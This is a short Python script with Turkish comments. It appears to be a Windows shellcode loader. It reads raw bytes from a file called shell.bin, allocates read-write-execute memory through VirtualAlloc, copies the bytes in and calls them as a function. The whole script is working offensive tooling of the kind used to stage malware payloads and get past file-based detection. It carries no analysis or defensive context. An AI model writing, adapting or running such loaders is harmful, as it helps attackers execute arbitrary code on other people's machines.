import ctypes
import os

# Bellek ayırma ve izinler için gerekli sabitler
PAGE_EXECUTE_READWRITE = 0x40
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000

# Betiğin bulunduğu dizini al
script_dir = os.path.dirname(os.path.abspath(__file__))

# shell.bin dosyasının tam yolunu oluştur
shellcode_path = os.path.join(script_dir, "shell.bin")

# shell.bin dosyasını oku ve binary veriyi al
with open(shellcode_path, "rb") as f:
    shellcode = f.read()

# Bellek ayırma
ptr = ctypes.windll.kernel32.VirtualAlloc(
    None,
    ctypes.c_size_t(len(shellcode)),
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
)

# Bellek ayrılmadıysa hata mesajı ver
if not ptr:
    raise Exception("Bellek ayırma işlemi başarısız oldu.")

# Shellcode'u belleğe yazma
ctypes.memmove(ptr, shellcode, len(shellcode))

# Shellcode'u çalıştırma
shellcode_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
shellcode_func()
